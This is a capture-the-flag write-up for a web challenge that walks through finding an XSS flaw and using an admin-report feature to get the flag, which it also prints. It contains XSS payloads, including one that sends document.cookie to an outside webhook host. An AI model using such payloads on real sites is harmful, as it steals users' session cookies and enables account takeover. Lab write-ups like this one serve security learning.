 # 『The challenge』

we were given this challenge:
<img width="1919" height="911" alt="image" src="https://github.com/user-attachments/assets/464b2521-e345-4e5b-9ad6-7cb462cab13b" />

Something interesting in here which there are 2 possible thing

 # 『Solving challenge』
> solve by: Lylera_

Firstly i though it would be ssti. here the result:

<img width="1919" height="909" alt="image" src="https://github.com/user-attachments/assets/e6feee04-633f-4722-ab91-04780a9e1f2d" />

And then i try something else. Lets try something. This `<script>alert(1)</script>`. Here the result:

<img width="1919" height="910" alt="image" src="https://github.com/user-attachments/assets/0722d451-50cf-404c-950c-c3fd2e75b857" />

it is not working but wait. Something missing. where `</script>`? it dissapear suddently. So i assume that this is XSS. So try the other.

Here the payload i use `<img src=x onerror=alert(1)`. Result:

<img width="846" height="223" alt="image" src="https://github.com/user-attachments/assets/9b62d64a-707e-4dcd-a14e-2bd4824d39fb" />

it works! So this is xss challenge. Why must `alert(1)`? You must confirm to check if `alert(1)` or anything else like `confirm(1)` can be popup like on picture.

After this, i open my burp to check where it gonna be last one.

<img width="1919" height="846" alt="image" src="https://github.com/user-attachments/assets/a53b67f0-2b7f-40f8-a6b1-35783c2eaf34" />

As you can see, this `report` is gonna be send to backend. Then i try searching something else before i make my payload.

<img width="450" height="33" alt="image" src="https://github.com/user-attachments/assets/45ee9236-22dc-4f42-8b7d-847e18269107" />

<img width="578" height="473" alt="image" src="https://github.com/user-attachments/assets/d0eb9e3c-c8cc-4c45-b950-3cd87ac6d38c" />

So i'm pretty sure this is gonna be XSS - SSRF. Why? because ``return window.location.href = `/${data.id}`;`` will execute the command of xss and will try to locate if i try to give it link and will open that link.

My conclusion will come to and end. 

# 『Flag』

Lets use this payload `<img src=x onerror= fetch('//webhook.site/?flag='+document.cookie)>` . 

<img width="917" height="179" alt="image" src="https://github.com/user-attachments/assets/fe8a6aec-e473-49a1-af26-2e562aced9a2" />

This is an error. So my assumption is `http` is included to get url location. So this is step by step:

```
Payload: <img src=x onerror= fetch('//webhook.site/?flag='+document.cookie)>
```

<img width="797" height="86" alt="image" src="https://github.com/user-attachments/assets/ccbd4a86-804f-489f-8b16-df7e642d9af3" />

The first one

<img width="794" height="91" alt="image" src="https://github.com/user-attachments/assets/6a10c49c-bca9-4be8-bc1d-2f2158571c53" />

The second one after i `report to admin`. Xss - endpoint ^^
```
Flag: compit{C00K13_C0O0K13_C0O0K13_C00K13333}
```
